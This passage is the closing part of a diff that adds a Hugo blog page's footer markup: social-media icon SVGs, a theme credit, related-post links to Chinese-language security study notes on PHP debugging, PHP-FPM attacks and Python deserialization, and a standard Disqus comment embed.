2c4.413.0 6.848 3.605 6.848 8.16l-.001.203.553 1.43.01.026c.225.606.413 1.153.556 1.626.348 1.15.522 2.129.535 2.916.007.407-.03.776-.118 1.108-.066.246-.161.48-.31.708-.276.427-.684.776-1.277.91.13.554.055 1.14-.24 1.654z"/></g></svg>
+</div>
+</a>
+<a href=vickyckyky target=_blank class="wechat icon pl-1 text-eucalyptus-400 hover:text-java-400" title="wechat link" rel=noopener aria-label="follow on wechat——Opens in a new window">
+<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g fill-rule="evenodd"><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M10 14.676v-.062c0-2.508 2.016-4.618 4.753-5.233C14.389 7.079 11.959 5.2 8.9 5.2 5.58 5.2 3 7.413 3 9.98c0 .969.36 1.9 1.04 2.698.032.038.083.094.152.165a3.568 3.568.0 011.002 2.238 3.612 3.612.0 012.363-.442c.166.026.302.046.405.06A7.254 7.254.0 0010 14.675zm.457 1.951a9.209 9.209.0 01-2.753.055 19.056 19.056.0 01-.454-.067 1.612 1.612.0 00-1.08.212l-1.904 1.148a.806.806.0 01-.49.117.791.791.0 01-.729-.851l.15-1.781a1.565 1.565.0 00-.439-1.223 5.537 5.537.0 01-.241-.262C1.563 12.855 1 11.473 1 9.979 1 6.235 4.537 3.2 8.9 3.2c4.06.0 7.403 2.627 7.85 6.008 3.372.153 6.05 2.515 6.05 5.406.0 1.193-.456 2.296-1.229 3.19-.051.06-.116.13-.195.21a1.24 1.24.0 00-.356.976l.121 1.423a.635.635.0 01-.59.68.66.66.0 01-.397-.094l-1.543-.917a1.322 1.322.0 00-.874-.169c-.147.023-.27.04-.368.053-.316.04-.64.062-.969.062-2.694.0-4.998-1.408-5.943-3.401zm6.977 1.31a3.325 3.325.0 011.676.174 3.25 3.25.0 01.841-1.502c.05-.05.087-.09.106-.112.489-.565.743-1.213.743-1.883.0-1.804-1.903-3.414-4.4-3.414-2.497.0-4.4 1.61-4.4 3.414s1.903 3.414 4.4 3.414c.241.0.48-.016.714-.046.08-.01.188-.025.32-.046z"/></g></svg>
+</div>
+</a>
+<a href=https://weibo.com/u/3337203335203336203332203334203333203334203331203331203332 target=_blank class="weibo icon pl-1 text-eucalyptus-400 hover:text-java-400" title="weibo link" rel=noopener aria-label="follow on weibo——Opens in a new window">
+<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M20.194 14.197c0 3.362-4.53 6.424-9.926 6.424C5.318 20.62 1 18.189 1 14.534c0-1.947 1.18-4.087 3.24-6.088 2.832-2.746 6.229-4.033 7.858-2.448.498.482.723 1.122.719 1.858 1.975-.576 3.65-.404 4.483.752.449.623.532 1.38.326 2.207 1.511.61 2.568 1.77 2.568 3.382zm-4.44-2.07c-.386-.41-.4-.92-.198-1.41.208-.508.213-.812.12-.94-.264-.368-1.533-.363-3.194.311a2.043 2.043.0 01-.509.14c-.344.046-.671.001-.983-.265-.419-.359-.474-.855-.322-1.316.215-.67.18-1.076.037-1.215-.186-.18-.777-.191-1.659.143-1.069.405-2.298 1.224-3.414 2.306C3.925 11.54 3 13.218 3 14.534c0 2.242 3.276 4.087 7.268 4.087 4.42.0 7.926-2.37 7.926-4.424.0-.738-.637-1.339-1.673-1.652-.394-.113-.536-.171-.767-.417zm7.054-1.617a1 1 0 01-1.936-.502 4 4 0 00-4.693-4.924 1 1 0 11-.407-1.958 6 6 0 017.036 7.384z"/></g></svg>
+</div>
+</a>
+<a href=https://www.zhihu.com/people/lan-shan-86-69 target=_blank class="zhihu icon pl-1 text-eucalyptus-400 hover:text-java-400" title="zhihu link" rel=noopener aria-label="follow on zhihu——Opens in a new window">
+<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M12.344 17.963l-1.688 1.074-2.131-3.35c-.44 1.402-1.172 2.665-2.139 3.825-.402.483-.82.918-1.301 1.375-.155.147-.775.717-.878.82l-1.414-1.414c.139-.139.787-.735.915-.856.43-.408.795-.79 1.142-1.206 1.266-1.518 2.03-3.21 2.137-5.231H3v-2h4V7h-.868c-.689 1.266-1.558 2.222-2.618 2.857L2.486 8.143c1.395-.838 2.425-2.604 3.038-5.36l1.952.434c-.14.633-.303 1.227-.489 1.783H11.5v2H9v4h2.5v2H9.185l3.159 4.963zm3.838-.07L17.298 17H19V7h-4v10h.736l.446.893zM13 5h8v14h-3l-2.5 2-1-2H13V5z"/></g></svg>
+</div>
+</a>
+</div>
+<div class="text-sm text-gray-500 leading-tight a-gray">
+<br>
+Built with Hugo and theme <a href=https://github.com/heyeshuang/hugo-theme-tokiwa>Tokiwa</a>. 3771 words in this page.
+</div>
+</div>
+</div>
+</aside>
+<footer class="w-full md:w-3/5 xl:w-1/2 order-3 max-w-3xl md:order-4 pt-2">
+<hr class=double-line>
+<div class="flex flex-wrap justify-between pb-2 leading-loose font-serif">
+<a class=flex-grow-0 href=/2021/11/25/php-remote-debug-env-init/><svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24"><path fill="none" d="M0 0h24v24H0z"/><path d="M7.828 11H20v2H7.828l5.364 5.364-1.414 1.414L4 12l7.778-7.778 1.414 1.414z"/></svg>
+PHP远程debug环境配置
+</a>
+</div>
+<div>
+<div class="font-serif pb-2 flex align-start leading-loose">
+<span class="heading pr-6 leading-loose">Related</span>
+<span>
+<a href=/2021/11/25/php-remote-debug-env-init/>PHP远程debug环境配置</a>&nbsp;&nbsp;/&nbsp;
+<a href=/2021/11/18/attack-php-fpm-study-notes/>攻击PHP-FPM学习笔记</a>&nbsp;&nbsp;/&nbsp;
+<a href=/2021/08/12/python-unserialize-notes-01-python/>反序列化专题笔记·壹·python篇</a>
+</span>
+</div>
+</div>
+<hr>
+<div class=pb-2>
+<div id=disqus_thread></div>
+<script type=application/javascript>var disqus_config=function(){};(function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById('disqus_thread').innerHTML='Disqus comments not available by default when the website is previewed locally.';return}var b=document,a=b.createElement('script');a.async=!0,a.src='//amiaaaz.disqus.com/embed.js',a.setAttribute('data-timestamp',+new Date),(b.head||b.body).appendChild(a)})()</script>
+<noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript>
+<a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a>
+</div>
+<hr>
+</footer>
+<script src=/dist/app.js></script>
+<script src=/lib/fuse.min.js></script>
+<script src=/lib/fastsearch.js></script>
+</div>
+</body>
+</html>
